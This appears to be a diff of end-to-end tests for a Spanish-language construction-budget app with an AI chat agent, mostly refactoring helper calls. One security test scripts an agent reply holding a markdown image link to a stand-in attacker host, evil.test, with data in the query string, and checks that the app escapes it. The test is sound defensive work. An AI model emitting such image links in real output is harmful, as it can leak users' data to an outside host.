@@ -41,7 +41,7 @@ def _item(e2e, rubro, monto=0, moneda="ARS", descripcion=None, **extra):
 
 def _plata(e2e, obra_id=1):
     at = e2e.go_to_obras(e2e.login())
-    return at.selectbox(key="plata_obra").set_value(obra_id).run()
+    return e2e.elegir_obra(at, obra_id)
 
 
 def visible(at) -> str:
@@ -479,7 +479,7 @@ def test_f03_ca_30b_obra_nueva_trae_imprevistos(e2e):
     item = finanzas.list_presupuesto(e2e.db, 1)[0]
     assert (item["descripcion"], item["monto"], item["moneda"]) == ("Imprevistos", "8500.00", "USD")
     assert item["es_imprevistos"] and item["rubro_id"] == _rubro(e2e, "Otros")
-    at = at.run().selectbox(key="plata_obra").set_value(1).run()
+    at = e2e.elegir_obra(at.run(), 1)
     assert _titulos(at)[0].startswith("Imprevistos — USD 8.500")
 
 
@@ -515,8 +515,8 @@ def test_f03_ca_32_no_hay_gastos_sueltos(e2e):
 def _chat(e2e, pedido, *respuestas):
     e2e.script(*respuestas)
     at = e2e.login()
-    at.sidebar.selectbox[0].set_value(1).run()
-    return at.chat_input[0].set_value(pedido).run()
+    at = e2e.elegir_obra(at, 1)
+    return e2e.abrir_agente(at).chat_input[0].set_value(pedido).run()
 
 
 def test_f03_ca_33_cargar_gasto_por_chat(e2e):
@@ -696,7 +696,7 @@ def test_f03_seg_4_respuesta_del_agente_no_carga_imagenes(e2e):
 
     _obra(e2e)
     e2e.script(AIMessage(content="Listo ![x](https://evil.test/p.png?d=datos) **ok**"))
-    at = e2e.login().chat_input[0].set_value("hola").run()
+    at = e2e.abrir_agente(e2e.login()).chat_input[0].set_value("hola").run()
 
     crudos = "\n".join(m.value for m in at.markdown)
     assert "\\![x](https://evil.test" in crudos and "**ok**" in crudos
